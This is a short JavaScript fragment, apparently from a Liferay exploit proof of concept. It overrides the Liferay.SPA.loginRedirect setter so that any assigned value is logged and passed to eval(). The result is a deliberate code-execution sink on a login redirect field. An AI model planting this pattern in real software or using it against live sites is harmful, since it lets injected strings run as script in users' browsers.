// Automatically triggers whenever loginRedirect is assigned
Object.defineProperty(Liferay.SPA, 'loginRedirect', {
  set: function(v) {
    console.log("[+] loginRedirect assigned:", v);
    eval(v); // Auto executes
  },
  get: function() {
    return '';
  },
  configurable: true
});
